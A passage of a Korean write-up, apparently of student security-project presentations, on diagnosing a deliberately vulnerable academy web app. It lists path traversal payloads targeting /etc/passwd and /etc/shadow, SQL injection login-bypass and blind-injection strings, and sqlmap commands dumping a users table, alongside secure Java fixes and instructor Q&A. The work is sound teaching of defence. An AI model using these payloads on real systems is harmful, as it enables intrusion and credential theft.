            "다른 사용자를 탈퇴시킬 수 없습니다.");
        return;
    }

    // DB 삭제 처리
    // ...
}
```

**방법 2: SameSite 쿠키 속성 사용**

```java
// 세션 쿠키에 SameSite 속성 추가
Cookie sessionCookie = new Cookie("JSESSIONID", session.getId());
sessionCookie.setHttpOnly(true);
sessionCookie.setSecure(true);
sessionCookie.setAttribute("SameSite", "Strict"); // ✅ CSRF 방어
response.addCookie(sessionCookie);
```

---

### 3. Path Traversal (경로 조작)

#### 취약점 설명

**발표 내용**:
> "**패스 트래버셜**입니다. 요것도 네 **루트 파일까지 들어가게 되는** 그런 취약점 인데요.
> 요것도 확인을 다 했습니다. 요런 식으로 접근을 하게 **직접 경로를 설정을 해서** 사용을 해가지고 접근을 하게 되면
> 네 요 **패스워드 시스템 파일까지 이렇게 탈취**를 하는 요런 것까지 확인을 했습니다."

#### 공격 시나리오

**정상 사용**:
```
URL: http://academy.example.com/download?file=lecture1.pdf
다운로드: /var/www/academy/uploads/lecture1.pdf
```

**악의적 사용**:
```
URL: http://academy.example.com/download?file=../../../../etc/passwd
실제 경로: /var/www/academy/uploads/../../../../etc/passwd
         = /etc/passwd
```

#### 다양한 Path Traversal 페이로드

```
# 기본 경로 조작
../../../../etc/passwd

# URL 인코딩
..%2F..%2F..%2F..%2Fetc%2Fpasswd

# 이중 인코딩
..%252F..%252F..%252F..%252Fetc%252Fpasswd

# 널 바이트 삽입 (구 버전)
../../../../etc/passwd%00.pdf

# 절대 경로
/etc/passwd

# Windows 경로
..\..\..\..\windows\system32\config\sam

# 혼합 슬래시
....//....//....//....//etc/passwd

# 유니코드 인코딩
..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
```

#### 수동 진단 절차

**Step 1**: 정상 파일 다운로드 테스트
```
http://academy.example.com/download?file=lecture1.pdf
→ 정상 다운로드 확인
```

**Step 2**: 경로 조작 시도
```
http://academy.example.com/download?file=../../../etc/passwd
```

**Step 3**: 시스템 파일 접근 확인

성공 시 `/etc/passwd` 내용이 다운로드됨:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

**Step 4**: 다른 민감 파일 접근 시도
```
/etc/shadow          # 암호화된 비밀번호
/etc/hosts           # 호스트 정보
/proc/self/environ   # 환경 변수
/var/log/apache2/access.log  # 웹 서버 로그
```

#### 방어 코드

```java
// DownloadServlet.java - 안전한 코드
import java.io.File;
import java.nio.file.Path;
import java.nio.file.Paths;

protected void doGet(HttpServletRequest request, HttpServletResponse response) {
    String filename = request.getParameter("file");

    if (filename == null || filename.isEmpty()) {
        response.sendError(HttpServletResponse.SC_BAD_REQUEST, "파일명이 필요합니다.");
        return;
    }

    try {
        // ✅ 업로드 디렉토리의 정규화된 경로
        Path uploadDir = Paths.get("/var/www/academy/uploads").toRealPath();

        // ✅ 요청된 파일의 정규화된 경로
        Path requestedFile = uploadDir.resolve(filename).normalize();

        // ✅ 경로가 업로드 디렉토리 내에 있는지 확인
        if (!requestedFile.startsWith(uploadDir)) {
            response.sendError(HttpServletResponse.SC_FORBIDDEN,
                "허용되지 않은 경로입니다.");
            return;
        }

        // ✅ 파일 존재 여부 확인
        File file = requestedFile.toFile();
        if (!file.exists() || !file.isFile()) {
            response.sendError(HttpServletResponse.SC_NOT_FOUND,
                "파일을 찾을 수 없습니다.");
            return;
        }

        // ✅ 안전하게 파일 다운로드 처리
        response.setContentType("application/octet-stream");
        response.setHeader("Content-Disposition",
            "attachment; filename=\"" + file.getName() + "\"");
        response.setContentLength((int) file.length());

        try (FileInputStream fis = new FileInputStream(file);
             OutputStream os = response.getOutputStream()) {

            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                os.write(buffer, 0, bytesRead);
            }
        }

    } catch (IOException e) {
        response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR,
            "파일 다운로드 중 오류가 발생했습니다.");
    }
}
```

**추가 보안 조치**:
```java
// 파일명 화이트리스트 검증
private boolean isValidFilename(String filename) {
    // ✅ 영문자, 숫자, 점, 언더스코어, 하이픈만 허용
    return filename.matches("^[a-zA-Z0-9._-]+$");
}

// ✅ 확장자 화이트리스트
private boolean isAllowedExtension(String filename) {
    String[] allowedExtensions = {".pdf", ".doc", ".docx", ".ppt", ".pptx"};
    return Arrays.stream(allowedExtensions)
                 .anyMatch(ext -> filename.toLowerCase().endsWith(ext));
}
```

---

### 4. SQL Injection - 관리자 권한 탈취

#### 공격 시나리오

**발표 내용**:
> "**SQL 인젝션** 인데요. 요거는 어 **오아 문 사용해 가지고** 앞에 게 아이디나 아이디랑 비번을 입력할 때
> **둘 중 하나의 값만 맞게 되면 로그인이 성공할 수 있는** 그런 문제점 확인하고자 했구요."

#### 공격 단계

**Step 1**: 로그인 페이지 접근

**Step 2**: SQL Injection 페이로드 입력

**발표 내용**:
> "**테스트 테스트** 네 둘 다 넣었을 때 이런 식으로 하면 네 **어드민 계정에 저희가 테스트로 넣어서 했는데**
> **비밀번호 없이 어드민 계정에 로그인** 하는 거 요것도 확인을 해서 네 **사용자 관리자 권한 탈취** 이런 문제점도 확인할 수 있었습니다."

**공격 입력**:
```
아이디: admin' OR '1'='1
비밀번호: (아무거나 또는 공백)
```

**생성되는 SQL**:
```sql
SELECT * FROM users
WHERE username='admin' OR '1'='1' AND password='anything'
```

**논리 분석**:
```
username='admin' OR '1'='1'
→ false OR true = true

전체 조건이 true가 되어 첫 번째 레코드(admin) 반환
```

#### 더 강력한 SQL Injection 공격

**UNION 기반 공격**:
```sql
-- 아이디 입력창
admin' UNION SELECT 1,2,3,4,5--

-- 생성되는 SQL
SELECT id, username, email, password, role FROM users
WHERE username='admin' UNION SELECT 1,2,3,4,5--' AND password='...'

-- 결과: 추가 데이터 추출 가능
```

**Boolean 기반 Blind SQL Injection**:
```sql
-- 비밀번호 길이 추측
admin' AND LENGTH(password)=8--

-- 비밀번호 첫 글자 추측
admin' AND SUBSTRING(password,1,1)='a'--
```

**Time 기반 Blind SQL Injection**:
```sql
admin' AND IF(LENGTH(password)=8, SLEEP(5), 0)--
```

#### 수동 진단 체크리스트

**로그인 페이지 테스트**:
- [ ] `admin' OR '1'='1` - 인증 우회
- [ ] `admin'--` - 주석 처리
- [ ] `' OR 1=1--` - 전체 조건 우회
- [ ] `admin' UNION SELECT ...` - 데이터 추출

**검색 기능 테스트**:
- [ ] `%' OR '1'='1` - 전체 데이터 조회
- [ ] `' UNION SELECT ...` - 다른 테이블 조회

**결과 확인**:
- [ ] 관리자 계정으로 로그인되는가?
- [ ] 다른 사용자의 정보가 노출되는가?
- [ ] DB 에러 메시지가 노출되는가?

#### 방어 코드

```java
// LoginServlet.java - 안전한 코드
protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    String username = request.getParameter("username");
    String password = request.getParameter("password");

    // ✅ PreparedStatement 사용 (가장 중요)
    String sql = "SELECT id, username, email, role FROM users " +
                 "WHERE username = ? AND password = ?";

    try (PreparedStatement pstmt = conn.prepareStatement(sql)) {
        pstmt.setString(1, username);
        pstmt.setString(2, password);

        ResultSet rs = pstmt.executeQuery();

        if (rs.next()) {
            // ✅ 로그인 성공
            HttpSession session = request.getSession();
            session.setAttribute("user_id", rs.getInt("id"));
            session.setAttribute("username", rs.getString("username"));
            session.setAttribute("role", rs.getString("role"));

            response.sendRedirect("index.jsp");
        } else {
            // ✅ 일반적인 에러 메시지 (정보 노출 방지)
            request.setAttribute("error", "아이디 또는 비밀번호가 일치하지 않습니다.");
            request.getRequestDispatcher("login.jsp").forward(request, response);
        }

    } catch (SQLException e) {
        // ✅ 에러 로그는 서버에만 기록, 사용자에게는 일반 메시지
        logger.error("Login error", e);
        request.setAttribute("error", "로그인 처리 중 오류가 발생했습니다.");
        request.getRequestDispatcher("error.jsp").forward(request, response);
    }
}
```

**추가 보안 조치**:
```java
// ✅ 입력값 검증
private boolean isValidUsername(String username) {
    // 영문자, 숫자만 허용 (특수문자 차단)
    return username != null && username.matches("^[a-zA-Z0-9]{4,20}$");
}

// ✅ 비밀번호 해싱 (평문 저장 금지)
import org.mindrot.jbcrypt.BCrypt;

// 회원가입 시
String hashedPassword = BCrypt.hashpw(password, BCrypt.gensalt());

// 로그인 시
if (BCrypt.checkpw(inputPassword, storedHashedPassword)) {
    // 로그인 성공
}
```

---

## 🐧 2.1.8 칼리 리눅스 도구 활용

**발표 내용**:
> "다음으로는 **칼리리눅스 툴 활용**을 했는데요. 세 가지로 **엠맵** 그리고 **뉴클레이** 그리고 **SQL맵**
> 요 세 가지를 확인했습니다."

### 1. Nmap - 포트 스캔

**발표 내용**:
> "**엠맵** 인데요 요거는 어 **외부 인터넷으로 접근을 했을 때** 그 **외부에서는 접근할 수 없게 막혀 있는게 보이구요**.
> 그리고 **내부 로컬호스트로 접근 했을 때** **내부에서는 접근할 수 있도록** 이 설정이 되어 있는 거를 확인할 수 있었습니다."

#### 외부 스캔 (인터넷에서)

**명령어**:
```bash
nmap -sV -p 1-65535 academy.example.com
```

**결과**:
```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for academy.example.com (52.79.xxx.xxx)
Host is up (0.0025s latency).

PORT     STATE  SERVICE  VERSION
22/tcp   open   ssh      OpenSSH 8.2p1 Ubuntu
80/tcp   open   http     nginx 1.18.0
443/tcp  open   https    nginx 1.18.0
3306/tcp closed mysql           # ✅ 외부에서 접근 불가

Nmap done: 1 IP address (1 host up) scanned in 125.43 seconds
```

**분석**:
- ✅ SSH (22), HTTP (80), HTTPS (443)만 외부에 개방
- ✅ MySQL (3306)은 외부에서 차단됨
- ⚠️ SSH가 외부에 개방되어 있음 (Bastion Host 역할)

#### 내부 스캔 (로컬 서버에서)

**명령어**:
```bash
ssh ubuntu@academy.example.com
nmap -sV localhost
```

**결과**:
```
Starting Nmap 7.94
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000010s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp   open  http     nginx 1.18.0
3306/tcp open  mysql    MariaDB 10.3.31  # ✅ 내부에서는 접근 가능
8080/tcp open  http     Apache Tomcat 9.0

Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds
```

**분석**:
- ✅ MySQL (3306)이 localhost에서는 접근 가능
- ✅ Tomcat (8080)도 내부에서만 접근 가능
- ✅ Nginx가 Reverse Proxy로 80→8080 포워딩

#### 수동 진단 가이드

**진단 절차**:
1. 외부에서 전체 포트 스캔
2. 개방된 포트 확인
3. 내부에서 로컬 포트 스캔
4. 내외부 차이 분석

**확인 사항**:
- [ ] 불필요한 포트가 외부에 개방되어 있지 않은가?
- [ ] DB 포트(3306)가 외부에서 차단되어 있는가?
- [ ] WAS 포트(8080)가 직접 노출되어 있지 않은가?

---

### 2. Nuclei - 취약점 스캔

**발표 내용**:
> "네 그 중에서 **뉴클레이** 같은 경우는 저희가 **수업시간에 했던 니크토**를 가지고 했던 거를
> **니크토는 좀 옛날 구 버전**이라서 그 좀 **최신 버전인 뉴클레이**로 진행을 하면서 **리뷰를 해보는 느낌**으로 다시 해봤습니다."

#### Nuclei란?

- **현대적인 취약점 스캐너** (Go 언어 기반)
- YAML 기반 템플릿 시스템
- 지속적으로 업데이트되는 취약점 DB
- Nikto보다 빠르고 정확함

#### Nuclei 설치 및 실행

```bash
# Kali Linux에서 Nuclei 설치
sudo apt update
sudo apt install nuclei -y

# 템플릿 업데이트
nuclei -update-templates

# 기본 스캔
nuclei -u http://academy.example.com

# 상세 스캔 (모든 템플릿)
nuclei -u http://academy.example.com -t ~/nuclei-templates/ -o academy_scan.txt

# 특정 취약점만 스캔
nuclei -u http://academy.example.com -t ~/nuclei-templates/cves/ -severity critical,high
```

#### 스캔 결과 예시

**발표 내용**:
> "그리고 **뉴클레이 결과 값도 이렇게 얻을 수 있었습니다**."

```
[INF] Current nuclei version: v3.1.5 (latest)
[INF] Current nuclei-templates version: v9.7.4 (latest)
[WRN] Scan results upload to cloud is disabled.

[CVE-2019-17558] [http] [critical] http://academy.example.com/manager/html
[tomcat-manager] [http] [high] http://academy.example.com/manager/
[apache-tomcat-status] [http] [medium] http://academy.example.com/examples/
[generic-tokens] [http] [info] http://academy.example.com/admin/server-status.jsp
[tech-detect:nginx] [http] [info] http://academy.example.com/
[tech-detect:tomcat] [http] [info] http://academy.example.com:8080/

[INF] Found 6 issues in 42.3 seconds
```

**발견된 취약점 분석**:

1. **CVE-2019-17558** (Critical):
   - Tomcat Manager 인증 우회 취약점
   - 조치: Tomcat Manager 삭제

2. **tomcat-manager** (High):
   - Tomcat Manager 접근 가능
   - 조치: 접근 제한 또는 삭제

3. **apache-tomcat-status** (Medium):
   - 예제 애플리케이션 존재
   - 조치: 불필요한 애플리케이션 제거

---

### 3. SQLMap - SQL Injection 자동화

**발표 내용**:
> "그리고 다음으론 **SQL맵**입니다. 예 요거는 요거는 네 SQL맵을 가지고
> 그 **사용자 테이블 전체에 추출을 하는 거를 확인**을 했습니다. 요것도 **심각 단계로 요렇게 확인**을 할 수 있었습니다."

#### SQLMap 기본 사용법

```bash
# 기본 스캔
sqlmap -u "http://academy.example.com/login.jsp" \
       --data="username=admin&password=test" \
       --batch

# DB 이름 확인
sqlmap -u "http://academy.example.com/login.jsp" \
       --data="username=admin&password=test" \
       --dbs \
       --batch

# 테이블 확인
sqlmap -u "http://academy.example.com/login.jsp" \
       --data="username=admin&password=test" \
       -D academy_db \
       --tables \
       --batch

# 특정 테이블 덤프
sqlmap -u "http://academy.example.com/login.jsp" \
       --data="username=admin&password=test" \
       -D academy_db \
       -T users \
       --dump \
       --batch
```

#### SQLMap 실행 결과

```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] starting @ 14:35:12

[14:35:12] [INFO] testing connection to the target URL
[14:35:13] [INFO] testing if the target URL content is stable
[14:35:14] [INFO] target URL content is stable
[14:35:14] [INFO] testing if POST parameter 'username' is dynamic
[14:35:14] [INFO] POST parameter 'username' appears to be dynamic
[14:35:15] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable
[14:35:15] [INFO] testing for SQL injection on POST parameter 'username'

[14:35:16] [INFO] POST parameter 'username' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable

available databases [3]:
[*] academy_db
[*] information_schema
[*] mysql

Database: academy_db
[5 tables]
+------------------+
| users            |
| courses          |
| enrollments      |
| materials        |
| notices          |
+------------------+

Database: academy_db
Table: users
[10 entries]
+----+----------+---------------------+-----------+-------+
| id | username | email               | password  | role  |
+----+----------+---------------------+-----------+-------+
| 1  | admin    | admin@example.com   | admin1234 | admin |
| 2  | student1 | student1@example.com| pass1234  | user  |
| 3  | student2 | student2@example.com| pass5678  | user  |
| 4  | teacher1 | teacher1@example.com| teach123  | user  |
| 5  | 전소원    | jeon@example.com    | jeon1234  | user  |
| 6  | 김주미    | kim@example.com     | kim5678   | user  |
| 7  | 김유영    | young@example.com   | young123  | user  |
| 8  | 전민석    | min@example.com     | min1234   | user  |
| 9  | 조남기    | jo@example.com      | jo5678    | user  |
| 10 | guest    | guest@example.com   | guest123  | user  |
+----+----------+---------------------+-----------+-------+

[*] ending @ 14:38:45
```

**발견 사항**:
- ✅ SQL Injection 취약점 확인
- ⚠️ **전체 사용자 정보 추출** 가능
- ⚠️ **비밀번호가 평문으로 저장**됨
- ⚠️ 관리자 계정 정보 노출

---

## 💬 2.1.9 질의응답 및 강사 피드백

### 질문 1: 수동 진단 vs 자동 진단

**질문** (학생):
> "수동으로 진행하시는 이유가 있나요?"

**답변** (팀장 조남기):
> "저희가 이게 **SSH 로그인 제한이나 포트 설정 같은 이런 정적 설정들은 자동화해서 효과적으로 진단**할 수 있는데
> 이런 **SQL 인젝션 같은 로직 취약점들은 실제 공격을 해봐야지 검증**할 수 있다고 생각을 했습니다.
> 그리고 **학습이 목적인 프로젝트**이기 때문에 AI만 사용하는 것 보다는
> **실제로 모든 팀원이 해보는 것이 중요**하다고 생각해서 수동 진단 가이드북에서 다 같이 진행해봤습니다."

**💡 핵심 인사이트**:
- 정적 설정(포트, 권한 등) → 자동 진단 적합
- 동적 로직 취약점(SQL Injection, XSS 등) → 수동 검증 필요
- 학습 목적 → 전 팀원이 직접 체험

---

### 질문 2: Nginx Reverse Proxy 사용 이유

**질문** (학생):
> "Nginx Reverse Proxy만 사용했는데, 사용 이유가 무엇인가요?"

**답변** (팀장 조남기):
> "사용자 편의를 위해서 **URL 접속할 때 80번 포트를 다른 포트번을 입력하는 것을 생략**하기 위해서 진행을 했고요.
> 이후에 **정적파일 서빙 성능 향상**과 **로드 밸런싱 확장 가능성**을 고려해서 Nginx를 앞단에 추가로 배치를 했습니다."

**💡 핵심 인사이트**:
1. **사용자 편의**: 포트 번호 입력 불필요 (80번 포트)
2. **성능 향상**: 정적 파일은 Nginx가 직접 서빙
3. **확장성**: 향후 Tomcat 다중화 시 로드 밸런싱 가능

---

### 질문 3: 진단 스크립트 검증

**질문** (강사):
> "아까 그 취약점 진단 스크립트에서는 총 40개의 취약점을 점검했다고 했는데
> 그럼 40개에서 8개는 지금 여러분들이 수동진단을 하면서 검증 과정을 거쳤다고 한다면
> **나머지 32개의 항목들에 대해서는 어떤 식으로 검증이 되는 거예요?**"

**답변** (팀원):
> "32가지 항목도 거의 **수동으로 취약점 진단한 것처럼 실제 서버에 이제 원격 접속을 해가지고**
> **거기 스크립트 나와있는 명령어를 사용한다면 실제로 눈으로 확인**할 수 있습니다.
> 그래서 그런 거를 증명할 수 있다고 생각을 합니다."

**추가 질문** (강사):
> "수동진단에서 8개라고 이렇게 개수를 명령이 8개로 말씀을 하셔서
> 그러면은 결국에는 **스크립트를 작성하는 과정에서 나머지 이제 여기에 PPT에는 드러나지 않지만**
> **나머지도 다 수동 검증은 끝냈다**라는 말씀이시죠?"

**답변**:
> "수동 검증 끝나진 않았지만 **대표적인 여기까지 OWASP Top 10** 그 기준으로 진행을 했습니다.
> 시간 관계상 다 한 번에 진행하지 못했습니다."

**강사 피드백**:
> "그러면 혹시 **확인 안 되고 AI를 활용해서 만든 스크립트가**
> 어 이건 취약하다 취약하지 않다라고 출력되는 그 **나머지 건수들에 대해서는 검증이나 확인이 안 된 사항들도 포함**하고 있나요?"

**답변**:
> "아니요 그거는 이제 **처음에는 오류 같은 게 많이 나왔었는데**
> 그런 거를 이제 그 **진단 스크립트 명령어를 촘촘히 짰다**고 해야 되나?
> 그렇게 진행하면서 **원하는 결과를 얻을 수 있도록** 이렇게 다 설계를 해놨습니다."

**💡 핵심 인사이트**:
- 초기에는 AI로 생성한 스크립트에 **오류가 많았음**
- 반복적인 테스트를 통해 **명령어를 정제**함
- 스크립트 결과가 **실제 상태를 정확히 반영**하도록 개선
- 시간 제약으로 **전체 수동 검증은 미완료**

---

### 강사 총평

**발표 시간에 대한 의견**:
> "발표 시간이 거의 한 30분 정도 걸렸는데 어 이렇게 하면은 오늘 하루 종일 아마 시간이 빠듯할 것 같은데
> 네 아닙니다 뭐 **그런다고 하고 싶은 말이 있으면 다 그 얘기를 해야 되기 때문에** 뭐 시간이 길어진다고
> 뭐 그 브릭이나 이런 건 없으니까 **표현하고 싶은 만큼 충분히 열심히 해주시면** 될 것 같아요."

**프로젝트 평가**:
> "**내용 발표 잘 들었고 개발도 짧은 기간에 잘 마무리해줬고**
> **처음에 걱정했던 것에 비해서 아웃풋도 굉장히 잘 나온 것 같아요**. 다들 고생해 주셨는데..."

**질문: 프로젝트 진행 중 가장 힘들었던 점**:
> "이 프로젝트를 5일밖에 안 됐지만 짧게 진행을 하면서
> 초기에 설계부터 여러가지 저한테 물어본 것도 많았고 얘기할 때 보면 **처음에 방향을 못 잡아가지고 갈팡질팡**하고 뭐 이랬던 거
> **프론트엔드도 몇 번 디자인도 변경**되고 이랬었는데
> 팀에서 이 프로젝트를 진행하면서 **가장 힘들었던 점과 어떻게 해결했는지**에 대해서 하나만 얘기해 줄 수 있을까요?"

**답변** (팀원):
> "가장 힘들었던 부분은 **시간적인 문제가 제일 컸던 것 같습니다**.
> 저희가 **하고 싶은 게 너무 많았어가지고** 최대한 하려고 살린 것들이 한 9개 정도
> 아까 수동진단 9개 정도로 축출해가지고 했고요.
> 그거를 좀 이렇게 **필터링하면서 이렇게 가지치기 하면서 최대한 추려본 9개** 그거를 하면서 그냥 해결했던 것 같습니다.
> 그냥 **시간적인 제약이 있기 때문에** 가장 해보고 싶은 거 그리고 각자 해보고 싶은 것들
> 그리고 **전체가 해봤으면 좋은 것들** 이런 것들을 분류해서 작업을 했기 때문에
> 크게 문제되는 부분들은 크게 없었던 것 같습니다."

---

## 🎓 2.1.10 핵심 학습 포인트 및 프로젝트 소감

### 프로젝트 소감

**발표 내용**:
> "예 저희 마지막으로 프로젝트 소감입니다.
> 저희 이번에 프로젝트를 수행하면서 **보안팀의 팀워크를 좀 체험**할 수 있어서 되게 뜻깊었구요."

### 학습 성과

#### 1. 확장 가능한 진단 시스템 구축

**발표 내용**:
> "저희가 구성한 그 **취약점 진단은 서버 모듈을 따로 만들어서 어떤 서버를 추가하든 좀 운영**할 수 있도록
> **다른 버전의 서버 구성이나 영역을 적용한다면 얼마든지 적용이 가능한 취약점 진단 시스템**이 되지 않을까라는 생각을 할 수 있었습니다.
> **그게 KISA 진단 기준이랑 OWASP TOP10을 기본으로 만들었기 때문이** 아닐까라는 생각까지 했습니다."

**핵심 포인트**:
- ✅ **XML 기반 서버 관리**: 새로운 서버 추가가 용이
- ✅ **표준 준수**: KISA + OWASP 기반으로 범용성 확보
- ✅ **모듈화**: OS, Web, DB 진단을 독립적으로 확장 가능

**확장 가능성 예시**:
```xml
<!-- 새로운 서버 추가 예시 -->
<server>
    <id>academy-dev-server</id>
    <name>Academy Development Server</name>
    <ip>10.0.1.100</ip>
    <os>centos</os>
    <web_server>apache</web_server>
    <was>wildfly</was>
    <db>postgresql</db>
</server>
```

#### 2. 역할 분담과 유기적 협업

**발표 내용**:
> "마지막으로 **역할 분담을 하면서 체계적으로 이 프로젝트를 수행**할 수 있었구요.
> 역할 분담은 했지만 이제 **끝에 수동 취약점을 같이 진단을 하면서 좀 유기적이고 되게 재밌는 프로젝트**가 되지 않았나 싶었습니다."

**협업 구조**:
```
팀 구성
├── 구축팀 (3명)
│   ├── 프론트엔드 개발
│   ├── 백엔드 API 개발
│   └── 취약점 삽입
│
├── 진단팀 (2명)
│   ├── 자동 진단 스크립트
│   └── 리포트 생성
│
└── 전체 팀 (5명)
    └── 수동 진단 가이드북 작성 및 검증
```

**협업의 장점**:
- ✅ **전문성**: 각자 맡은 역할에 집중
- ✅ **효율성**: 병렬 작업으로 시간 절약
- ✅ **학습 효과**: 마지막 수동 진단을 통해 전체 시스템 이해

#### 3. 표준 가이드 활용의 중요성

**KISA 가이드 적용**:
- 40개 진단 항목 중 대부분이 KISA 가이드 기반
- 실무에서도 활용 가능한 수준
- 조치 방법까지 명확하게 정리

**OWASP Top 10 적용**:
- 수동 진단 8-9개 항목이 OWASP 기반
- 실제 웹 공격 시나리오 학습
- 방어 코드 작성 경험

#### 4. 자동화와 수동 진단의 균형

**자동 진단**:
- ✅ 정적 설정 확인에 효율적
- ✅ 대량의 서버 점검 가능
- ✅ 일관된 기준 적용

**수동 진단**:
- ✅ 로직 취약점 검증 필수
- ✅ 공격 시나리오 이해
- ✅ False Positive 검증

**10조의 접근**:
```
진단 전략
├── 자동 진단 (40개 항목)
│   ├── OS 보안 설정
│   ├── 웹 서버 설정
│   └── DB 보안 설정
│
└── 수동 진단 (8-9개 항목)
    ├── Command Injection
    ├── SQL Injection
    ├── CSRF
    ├── Path Traversal
    ├── SSRF
    ├── XSS
    ├── 권한 검증 미흡
    └── 민감정보 노출
```

### 최종 프로젝트 활용 가능성

**강사 평가**:
> "**이번 기수가 지금까지 본 미니 프로젝트 아웃풋 중 가장 우수했습니다.**"

**활용 방안**:
1. **최종 프로젝트 기반**: 이번 프로젝트를 확장하여 최종 프로젝트 진행 가능
2. **다양한 환경 적용**: Windows, CentOS, PostgreSQL 등으로 확장
3. **CI/CD 통합**: Jenkins, GitLab CI와 연동하여 자동 진단
4. **대시보드 추가**: 진단 결과를 시각화하는 웹 대시보드 구현

### 프로젝트 통계 요약

| 항목 | 내용 |
|:---|:---|
| **프로젝트 기간** | 2025.12.30 ~ 2026.01.05 (7일) |
| **팀 구성** | 5명 (구축 3명 + 진단 2명) |
| **웹 페이지** | 8개 기능 페이지 + 의도적 취약점 8개 |
| **자동 진단 항목** | 40개 (OS 13 + Web 14 + DB 13) |
| **수동 진단 항목** | 8-9개 (OWASP Top 10 기반) |
| **칼리 도구** | 3개 (Nmap, Nuclei, SQLMap) |
| **발표 시간** | 약 30분 |
| **진단 취약률** | 60% (24개 취약 / 40개 항목) |

---

**10조 프로젝트 상세 분석 완료**

다음: Section 2-2 (7조 LMS 서비스 프로젝트)
# Section 2-2: 7조 "LMS 서비스" - 플러그인 기반 진단 자동화 프로젝트 상세 분석

---

## 🎯 2.2.1 팀 구성 및 역할 분담

### 팀 정보

**팀원**: 김민곤, 나형진, 박하영, 이동훈 (총 4명)
**발표자**: 김민곤

### 역할 분담

**발표 내용**:
> "팀원 소개입니다. 김민곤, 나형진, 박하영, 이동훈 총 4명으로 이루어져 있으며 다음과 같은 역할을 수행했습니다."

| 팀원 | 주요 역할 |
|:---|:---|
| **김민곤** | - 프로젝트 총괄<br>- 진단 도구 코어 아키텍처 설계<br>- 플러그인 시스템 구현<br>- 발표 |
| **나형진** | - 웹 서비스 개발 (Spring Boot)<br>- JWT 토큰 인증 구현<br>- 취약점 구현 |
| **박하영** | - AWS 인프라 구성<br>- VPC/Security Group 설정<br>- KISA 가이드 플러그인 개발 |
| **이동훈** | - Streamlit 대시보드 구현<br>- 리포트 생성 모듈<br>- Stryker AI 연동 |

---

## 📊 2.2.2 프로젝트 개요 및 목표

### 프로젝트 개요

**발표 내용**:
> "프로젝트 개요입니다. **웹 서비스에서는 파일 업로드, 인증 인가, 권한 처리 등 다양한 취약점을 자연스럽게 구현할 수 있는 LMS 서비스**를 선택하여 구현했습니다."

**LMS (Learning Management System) 선정 이유**:

1. **다양한 취약점 구현 가능**:
   - 파일 업로드 (강의 자료, 과제 제출)
   - 인증/인가 (학생, 교수, 관리자)
   - 권한 처리 (게시글 접근 제어)
   - 세션 관리 (로그인 상태 유지)

2. **실제 서비스와 유사한 구조**:
   - 사용자 등급 (학생 < 교수 < 관리자)
   - 커뮤니티 기능 (게시판, 댓글)
   - 파일 관리 (업로드/다운로드)

### 진단 도구 구성

**발표 내용**:
> "**취약점 진단 자동화 도구**에서는 **SSH 접속 기반 원격 서버 진단**과 **URL 링크를 통한 다이나믹 진단**, **GitHub 레포지토리 링크를 통한 스태틱 진단** 3가지 채널로 구성되어 있습니다."

#### 진단 채널 3가지


**진단 범위**:
> "**원격 서버 진단은 KISA 가이드 기반 유닉스 서버 부분 67가지 항목을 모두 구현**했으며
> **SAST, DAST는 Stryker AI 에이전트 오픈 소스 기반 자동화 진단**으로 구현했습니다."

---

## 🤝 2.2.3 협업 도구 및 개발 프로세스

### GitHub를 통한 협업

**발표 내용**:
> "프로젝트 진행을 위해 저희가 사용한 **협업 도구** 먼저 설명드리겠습니다.
> **기능 개발 전용인 Feature 브랜치와 배포용 Main 브랜치로 구분**하여 안정적인 개발 환경을 구축했습니다."

#### Git 브랜치 전략

```
main (배포용)
  │
  ├─── feature/web-service (웹 서비스 개발)
  │
  ├─── feature/diagnosis-core (진단 코어)
  │
  ├─── feature/kisa-plugins (KISA 플러그인)
  │
  ├─── feature/streamlit-dashboard (대시보드)
  │
  └─── feature/stryker-integration (Stryker 연동)
```

**협업 프로세스**:
> "각 기능은 **독립적인 Feature 브랜치에서 개발한 후 Main 브랜치로 병합**하여
> **PR을 통해서 정규 교육시간 외에도 언제든지 본인이 작업한 코드를 PR을 통해 리뷰받고 수정**하며 협업 효율을 증가시킬 수 있도록 진행했습니다."

**Pull Request 예시**:
```markdown
# PR #12: KISA U-01~U-10 플러그인 구현

## 변경 사항
- U-01: root 계정 원격 접속 제한 플러그인 추가
- U-02: 패스워드 복잡성 설정 플러그인 추가
- ... (총 10개 플러그인)

## 테스트 결과
- [x] Ubuntu 20.04 테스트 완료
- [x] CentOS 7 테스트 완료
- [ ] Red Hat 8 테스트 예정

## 리뷰 요청 사항
- 플러그인 YAML 스키마 검토
- 에러 처리 로직 확인

@na-hyungjin @park-hayoung
```

### Notion을 통한 문서화

**발표 내용**:
> "다음으로 **Notion**입니다. **실시간 협업 회의록**으로 회의 과정을 기록하고 **다음 할 일 등의 관리를 체계적으로 수행**했으며
> **레퍼런스 문서, 웹 링크, 참고 이미지 등 프로젝트 전반에 필요한 자료를 체계적으로 관리**했습니다."

**Notion 페이지 구조**:
```
📘 7조 LMS 프로젝트
├── 🏠 홈
│   ├── 프로젝트 개요
│   ├── 팀원 역할
│   └── 진행 상황 대시보드
│
├── 📅 회의록
│   ├── 2025-12-30 킥오프 미팅
│   ├── 2026-01-02 중간 점검
│   └── 2026-01-04 최종 리뷰
│
├── 📝 할 일 관리
│   ├── TODO
│   ├── In Progress
│   └── Done
│
├── 📚 레퍼런스
│   ├── KISA 가이드 정리
│   ├── OWASP Top 10 요약
│   ├── Stryker AI 문서
│   └── AWS 아키텍처 참고자료
│
└── 🔗 유용한 링크
    ├── GitHub Repository
    ├── AWS Console
    ├── Streamlit Dashboard
    └── 기술 블로그
```

**회의록 예시**:
```markdown
